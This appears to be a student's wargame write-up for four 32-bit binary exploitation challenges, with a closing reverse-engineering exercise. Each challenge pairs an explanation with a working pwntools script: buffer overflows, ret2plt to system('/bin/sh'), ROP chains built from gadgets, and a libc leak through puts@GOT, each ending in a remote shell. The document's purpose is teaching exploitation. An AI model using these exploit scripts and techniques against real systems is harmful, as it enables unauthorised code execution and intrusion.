swrop
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNi1zd3JvcCIsImlwIjoiMTEwLjE3NC41LjEzNyIsInNlc3Npb24iOiI3YWZjMmZiYS1iZTBlLTQ3N2ItOTAzZi1kMTU0OWMyMzg1ZDkifQ.JIgBr5ltvLmRjLIw0rQxr64C6ZscfFzCUdhIP8dsyR8}

General overview of problems faced
-------------------------------------
# This binary simply calls 'read', attempting to read up to 0x100 bytes from stdin
# into a buffer. If we run the program in gdb, and pass in a cyclic sequence of
# length 300, it displays 'Invalid address 0x6261616a'. Using cyclic -l '0x6261616a',
# we determine this is at offset 136. Hence, this is the offset of the return address.

# Given this, we want to overwrite the return address to jump to another function.
# Looking in binary ninja, the function 'not_call' calls the library function 'system',
# which is the function we need to pop a shell. If a library function is used anywhere
# in a binary, then we can call this function directly using its GOT address (without
# having to access libc). Hence, looking in binary ninja shows the address of the
# 'system' function is 0x8048390 (with this simply jumping to the GOT table to find
# the real 'system' function).

# When calling 'system', if we want to pop a shell then we need to pass it the
# argument 'bin/sh'. To find if this string exists in the binary itself, we do:
# ropper -f challenges/swrop --string '/bin/sh' which gives us the address 0x080485f0.

# Now that we have our function and its argument, we can simply construct our payload
# containing these and place it at the offset of the return address.

Script/Command used
------------------
```
p = remote("plsdonthaq.me", 6001)

# Our payload consists of the 'system' function which we want to jump to,
# followed by the return address for 'system' (can be anything as we don't return),
# and finally the first argument for 'system' (being a pointer to the string /bin/sh).
payload = (
    p32(0x8048390) +
    b"XXXX" +
    p32(0x080485f0)
)

# We then send this payload at offset 136, overwriting the return address.
p.sendline(flat({
 136: payload
}))

# Now we have popped a shell, we can access the flag.
p.interactive()
```

static
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNi1zdGF0aWMiLCJpcCI6IjExMC4xNzQuNS4xMzciLCJzZXNzaW9uIjoiMWQ0ODhiZWYtMWRiMi00ZjM3LWFiZGItMDhjZjIwMDRjNWQ0In0.ZW1lwKz3FWm_DjnJLNvx43RjNGqLN6BRbIuqJMIQOew}

General overview of problems faced
-------------------------------------
# When opening this binary in binary ninja, there are way more functions than normal,
# which suggests that we might not need to use libc. The program itself simply calls
# gets on my input. Running this in gdb and passing in a cyclic sequence of length
# 300, it displays 'Invalid address 0x61616165'. Using cyclic -l '0x61616165', we can
# see the offset is 16. Hence, this is where we want to place our payload.

# In our payload, we want to construct a ROP chain using gadgets in the binary to
# run the command execve("/bin/sh", NULL, NULL). Using shellcode, we would do:
'''
mov eax, 11
mov ebx, "/bin/sh"
xor ecx, ecx
xor edx, edx
int 0x80
'''

# If we wanted to place a value in register ebx (like the string "/bin/sh" in this
# example), we would do pop ebx. However, remember that pop takes the next 4 bytes off 
# the stack and places it into the register. Hence, we cannot pop the 8 byte string
# "/bin//sh" into register ebx.

# However, we notice in gdb that after gets returns, it places the start of our
# buffer (which is part of the cyclic sequence created by flat) into the eax register.
# Hence, we can simply place '/bin/sh\x00' at the start of our buffer, and then using
# gadgets find a way to move it from eax to ebx.

Script/Command used
------------------
```
p = remote("plsdonthaq.me", 6002)

# Using ropper, we were able to find the following gadgets that we can use to
# construct a ROP chain in our payload.
mov_edi_eax = 0x0806af9d
mov_edx_edi = 0x0809c216
mov_ebx_edx = 0x0806d956
pop_edx = 0x0806eb8b
xor_eax_eax = 0x08056200
inc_eax = 0x0807c01a
xor_ecx_ecx_int_80 = 0x0806ef51

# Now we can construct our ROP chain. Since the string '/bin/sh\x00' is stored in
# register eax, we move it from eax to ebx by chaining the following gadgets:
# eax -> edi -> edx -> ebx
# After this, we simply setup the other registers for execve("/bin/sh", NULL, NULL).
payload = (
    p32(mov_edi_eax) + # mov edi, eax; mov esi, edx; mov eax, dword ptr [esp + 4]; ret;
    p32(mov_edx_edi) + # mov edx, edi; pop esi; pop edi; pop ebp; ret;
    p32(0) +
    p32(0) +
    p32(0) +
    p32(mov_ebx_edx) + # mov ebx, edx; cmp eax, 0xfffff001; jae 0x290c0; ret;
    p32(pop_edx) + # pop edx; ret;
    p32(0) +
    p32(xor_eax_eax) + # xor eax, eax; ret;
    p32(inc_eax)*11 + # inc eax; ret;
    p32(xor_ecx_ecx_int_80) # xor ecx, ecx; int 0x80;
)
 
# We then send the string "/bin/sh\x00" at the start of the buffer, and then our
# payload at offset 16, which is where the return address is located.
p.sendline(flat({
 0: b"/bin/sh\x00",
 16: payload
}))

# Now we have shell access, we can view the flag.
p.interactive()
```

roproprop
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNi1yb3Byb3Byb3AiLCJpcCI6IjExMC4xNzQuNS4xMzciLCJzZXNzaW9uIjoiMTQzZmE3YjItMzc4Yi00NWZkLTgyYmYtMDhmOWEzMzZhYzA1In0.XOqGdfXjlMyFBiynsIqpQcCEF9iFKDMeXk_DorkYTho}

General overview of problems faced
-------------------------------------
# If we run the program in gdb, and pass in a cyclic sequence of length 10,000, it 
# displays 'Invalid address 0x61696d61'. Using cyclic -l '0x61696d61',
# we determine this is at offset 1230. Hence, this is the offset of the return address.

# To determine the base of libc, we can use the leaked libc address that the program
# displays when starting up. In binary ninja, we can see the program is simply 
# printing the address of setbuf at this point. We also note that the libc file used 
# was given to us in the wargames, being version 2.23. Hence, executing the command
# readelf -s challenges/libc-2.23.so | grep ' setbuf' reveals the offset of setbuf
# is 00065ff0, so we simply subtract this from our leak to get the base.

# Given this, we can now use any gadgets found in libc, and simply add the offsets
# for these to the libc base. Using these, we want to create a ROP chain that does
# execve("/bin/sh", NULL, NULL). Using shellcode, we would do:
'''
mov eax, 11
mov ebx, "/bin/sh"
xor ecx, ecx
xor edx, edx
int 0x80
''' 

# Using ropper, we can find these gadgets and chain them together in our payload.
# If we finally send this payload such that it overwrites the return address, we
# will pop a shell and be able to access the flag.

Script/Command used
------------------
```
p = remote("plsdonthaq.me", 6003)

# First we need to extract the leaked libc address.
p.recvuntil("- ")
libc_leak = int(p.recv(10), 0)

# Given this, we find the offset of setbuf in libc (which is what was being printed),
# and subtract it from this leak to get the base of libc.
libc_base = libc_leak - 0x00065ff0

# Now using ropper we are able to find gadgets to use in our payload, adding the
# offsets given to the libc base.
xor_eax_eax = libc_base + 0x0002c79c
inc_eax = libc_base + 0x00024b41
pop_ebx = libc_base + 0x00089293
bin_sh = libc_base + 0x0015ba0b
pop_ecx_edx = libc_base + 0x0002bc6c
int_80 = libc_base + 0x00002c87

# Our payload then consists of these gadgets chained together to pop a shell.
payload = (
    p32(xor_eax_eax) + # xor eax, eax; ret;
    p32(inc_eax)*11 + # inc eax; ret;
    p32(pop_ebx) + # pop ebx; ret
    p32(bin_sh) + # /bin/sh that pops into ebx
    p32(pop_ecx_edx) + # pop ecx; pop edx; ret;
	p32(0) +
	p32(0) +
    p32(int_80) # int 0x80;
)

# We then send this payload at the offset of the return address.
p.sendline(flat({
 1230: payload
}))

# Given we now have shell, we can access the flag.
p.interactive()
```

ropme
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNi1yb3BtZSIsImlwIjoiMTEwLjE3NC41LjEzNyIsInNlc3Npb24iOiJjOGU0Yjg3NS0xOTA0LTQzNjEtYjM5My0zOTUwNzI4YWE2NmIifQ.PUeRpsqrtynNR-AgHchZq4SPvXmqiu7wyAlc6pRPHDA}

General overview of problems faced
-------------------------------------
# To begin, we determine the return address is at offset 12 from the start of the
# buffer, so this is where we will place our payload to overwrite the return address.

# Since we don't have a libc leak, we have to use gadgets in the binary itself. 
# However, the binary doesn't contain enough gadgets to pop a shell. Hence, we will 
# first use these gadgets to leak a libc address, and then can return to main such 
# that we can construct another payload that utilises the libc gadgets.

# To leak a libc address, we can emulate the command puts(&puts), which will simply
# display the libc address for the puts function. To do so, we can load binary ninja
# and see the puts function in the list of symbols on the left hand side. Then, we
# can see the address of puts is 0x80483b0. This function then simply jumps to the
# GOT entry for puts, which if we navigate to in binary ninja it shows the address is
# 0x804a014. 

# Finally, if we want to return to main after leaking this address such that the
# program restarts, we need the address of main, which looking in binary ninja is
# 0x8048539.

# Now that we have leaked the libc address of puts, we can determine the libc base,
# which is simply the leak minus the libc offset for puts. We find the libc offset for
# puts with the command readelf -s challenges/libc-2.23.so | grep ' puts', which gives
# is 0005fca0.

# Given this, we now have access to all the gadgets in libc, and can use any gadgets
# within libc to pop a shell. Whilst in roproprop I created a ROP chain that emulated
# the command execve('/bin/sh', NULL, NULL), in this challenge I will emulate the
# command system('/bin/sh'). To do so, we simply need to find the offset of the
# system function in libc by doing readelf -s challenges/libc-2.23.so | grep ' system',
# and then find the offset of the string '/bin/sh' in libc by using the command
# ropper -f challenges/libc-2.23.so --string '/bin/sh', and add these offsets to the
# libc base. For the return address we can put anything as system doesn't return.

Script/Command used
------------------
```
p = remote("plsdonthaq.me", 6004)

# This payload will call the function puts, with its argument being the GOT entry
# for puts, and will return to the main function.
payload = (
    p32(0x80483b0) + # address of puts function
    p32(0x8048539) + # address of main function
    p32(0x804a014) # address of GOT entry for puts
)

# We then send this payload at offset 12, where the return address is located.
p.sendline(flat({
 12: payload
}))

# The program now prints the libc address of puts, which we extract from the first
# four bytes of output. Also since it is a byte string representing an address, we
# want to unpack it into an int.
p.recvuntil("Gimme data: \n")
libc_leak = u32(p.recvline()[:4])

# Using this leaked libc address for puts, we find the libc offset for puts and
# subtract it from the leak to get the libc base.
libc_base = libc_leak - 0x0005fca0

# Since we are executing system('/bin/sh'), we need the address of the system
# function and the address of the string '/bin/sh', adding both of these to the
# libc base.
system = libc_base + 0x0003ada0
bin_sh = libc_base + 0x0015ba0b

# Our payload then calls the function system with the argument '/bin/sh', and it
# doesn't return so we put anything in this slot.
payload = (
    p32(system) + # address of system function
    b"XXXX" + # any return address (since system doesn't return)
    p32(bin_sh) # address of string '/bin/sh'
)

# We then send this payload at the offset of the return address.
p.sendline(flat({
 12: payload
}))

# Now we should have shell access and can get the flag.
p.interactive()
```

re challenge
=============
General overview of problems faced
-------------------------------------
To reverse engineer this assembly, I simply focused on one box at a time, working my way through the program until I had a decent idea of what it did.

It starts by setting the variables 'var_C' and 'var_8' to 0, so I initially assumed these were both ints and set them to 0. Then, I could determine it entered a while loop, with the condition being if the counter 'i' is less than or equal to 9. If it isn't, then 'var_C' is returned.

If the while loop condition passed, then it calls malloc with argument 8. It then assigns the pointer returned by malloc to a variable 'var_4'. If this equals 0 (or NULL since its a pointer), then exit is called with argument 1.

Next, it checks if 'var_C' is equal to 0. If it is, it sets 'var_C' equal to 'var_4'. Otherwise, it accesses 'var_4' + 4 and makes it equal to 'var_C', and then assigns 'var_C' to equal 'var_4'. It was at this point that I realised we were dealing with a struct, where one of the elements in this struct is a pointer to another struct element. Hence, this is a linked list, so I restructed my program to utilise this.

The final part of this program sets 'var_4' + 4 to be equal to 0, which corresponds to setting the 'next' pointer for this linked list to be NULL. What comes next was the most confusing part for me, yet I eventually discovered it was adding the char 'A' to the loop counter, and storing this byte value into the address of the linked list 'var_4'. To replicate this in C, I added a char field in the struct, with this line assigning the char field to be equal to i + 'A'.

Finally, to ensure this code would compile, I included the library functions 'stdio.h' and 'stdlib.h', as well as creating a main function which simply calls the unwind function we created.

```C
#include <stdio.h>
#include <stdlib.h>

struct list {
    char value;
    struct list* next;
};

struct list * unwind() {

    struct list *myStruct = NULL; // var_C
    
    int i = 0; // var_8
    while (i <= 9) {

        struct list *tmp = malloc(8); // var_4
        if (tmp == NULL) {
            exit(1);
        }

        if (myStruct == NULL) {
            myStruct = tmp;
        } else {
            tmp->next = myStruct;
            myStruct = tmp;
        }

        tmp->next = NULL;
        tmp->value = i + 'A';
        i++;
    }

    return myStruct;
}

int main(void) {
    unwind();
    return 0;
}
``